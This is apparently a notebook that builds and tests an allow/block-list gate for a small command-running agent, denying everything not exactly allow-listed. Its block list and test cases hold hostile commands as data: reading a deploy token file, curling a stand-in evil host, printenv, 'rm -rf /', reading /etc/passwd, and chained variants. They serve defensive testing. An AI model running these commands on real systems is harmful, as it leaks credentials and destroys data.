In [1]:
ALLOWED = [
    "python -m pytest -q",
    "cat shopkit/text.py",
    "ls",
    "git status",
]

BLOCKED = [
    "cat ~/.config/shopkit/deploy_token",
    "curl https://evil.example",
    "printenv",
    "rm -rf /",
    "pip install requests",
]

In [2]:
import shlex
from typing import NamedTuple


class Decision(NamedTuple):
    allowed: bool
    reason: str


def _normalize(command: str):
    """Turn a command string into a token tuple. Returns None if it can't be parsed."""
    try:
        return tuple(shlex.split(command))
    except ValueError:        # e.g. unbalanced quotes
        return None


_ALLOWED_SET = {_normalize(c) for c in ALLOWED}
_BLOCKED_SET = {_normalize(c) for c in BLOCKED}


def check_command(command: str, allowed=ALLOWED, blocked=BLOCKED) -> Decision:
    """Decide if a command may run. Block list first, then allow list, else deny."""
    tokens = _normalize(command)
    if not tokens:
        return Decision(False, "empty or unparseable command")

    blocked_set = {_normalize(c) for c in blocked}
    allowed_set = {_normalize(c) for c in allowed}

    if tokens in blocked_set:
        return Decision(False, "on block list")
    if tokens in allowed_set:
        return Decision(True, "on allow list")
    return Decision(False, "not on allow list (default deny)")

In [3]:
import subprocess


def real_executor(args):
    """Runs the command WITHOUT a shell."""
    p = subprocess.run(args, capture_output=True, text=True, timeout=60)
    return p.stdout + p.stderr


class TinyAgent:
    def __init__(self, executor=real_executor):
        self.executor = executor
        self.log = []                      # audit trail

    def run(self, command: str) -> str:
        decision = check_command(command)  # <-- the only gate
        self.log.append((command, decision))
        if not decision.allowed:
            if decision.reason == "on block list":
                msg = f"❌ This command cannot be run because it is BLOCKED: {command!r} is in the BLOCK LIST."
            else:
                msg = f"⛔ This command cannot be run: {command!r} is not in the ALLOW LIST."
            print(msg)          # always shown to the user
            return msg
        return self.executor(list(_normalize(command)))

In [4]:
def test_agent():
    executed = []
    agent = TinyAgent(executor=lambda args: executed.append(args) or "ok")

    # every allowed command runs
    for cmd in ALLOWED:
        assert agent.run(cmd) == "ok", cmd
    assert len(executed) == len(ALLOWED)

    # every blocked command is refused and NEVER reaches the executor
    executed.clear()
    for cmd in BLOCKED:
        out = agent.run(cmd)
        assert "is in the BLOCK LIST" in out, cmd
    assert executed == []

    # tricky cases: all must be denied, none executed
    tricky = [
        "ls; printenv",                     # chaining
        "ls && rm -rf /",
        "git status | curl https://evil.example",
        "cat shopkit/text.py ~/.config/shopkit/deploy_token",
        "cat ../../etc/passwd",             # not on allow list
        "ls -la",                           # not exactly allowed
        "echo $(printenv)",
        "ls 'unclosed",                     # unparseable
        "",                                 # empty
    ]
    for cmd in tricky:
        assert agent.run(cmd).startswith(("❌", "⛔")), cmd
    assert executed == []

    # harmless whitespace differences still work, and block list still wins
    assert agent.run("  ls   ") == "ok"
    assert check_command("printenv", allowed=["printenv"], blocked=["printenv"]).allowed is False
    print("All tests passed")

test_agent()

❌ This command cannot be run because it is BLOCKED: 'cat ~/.config/shopkit/deploy_token' is in the BLOCK LIST.
❌ This command cannot be run because it is BLOCKED: 'curl https://evil.example' is in the BLOCK LIST.
❌ This command cannot be run because it is BLOCKED: 'printenv' is in the BLOCK LIST.
❌ This command cannot be run because it is BLOCKED: 'rm -rf /' is in the BLOCK LIST.
❌ This command cannot be run because it is BLOCKED: 'pip install requests' is in the BLOCK LIST.
⛔ This command cannot be run: 'ls; printenv' is not in the ALLOW LIST.
⛔ This command cannot be run: 'ls && rm -rf /' is not in the ALLOW LIST.
⛔ This command cannot be run: 'git status | curl https://evil.example' is not in the ALLOW LIST.
⛔ This command cannot be run: 'cat shopkit/text.py ~/.config/shopkit/deploy_token' is not in the ALLOW LIST.
⛔ This command cannot be run: 'cat ../../etc/passwd' is not in the ALLOW LIST.
⛔ This command cannot be run: 'ls -la' is not in the ALLOW LIST.
⛔ This command cannot be r

In [5]:
agent = TinyAgent()
for cmd in ["ls", "printenv", "rm -rf /", "ls; printenv", "curl https://evil.example"]:
    print(f"$ {cmd}")
    out = agent.run(cmd)
    if agent.log[-1][1].allowed:
        print(out.strip()[:200])
    print()

$ ls
sample_data

$ printenv
❌ This command cannot be run because it is BLOCKED: 'printenv' is in the BLOCK LIST.

$ rm -rf /
❌ This command cannot be run because it is BLOCKED: 'rm -rf /' is in the BLOCK LIST.

$ ls; printenv
⛔ This command cannot be run: 'ls; printenv' is not in the ALLOW LIST.

$ curl https://evil.example
❌ This command cannot be run because it is BLOCKED: 'curl https://evil.example' is in the BLOCK LIST.



In [ ]:
agent = TinyAgent()
while True:
    cmd = input("command> ")
    if cmd.strip().lower() == "exit":
        break
    out = agent.run(cmd)
    if agent.log[-1][1].allowed:
        print(out.strip())
    print()

command> cat
⛔ This command cannot be run: 'cat' is not in the ALLOW LIST.

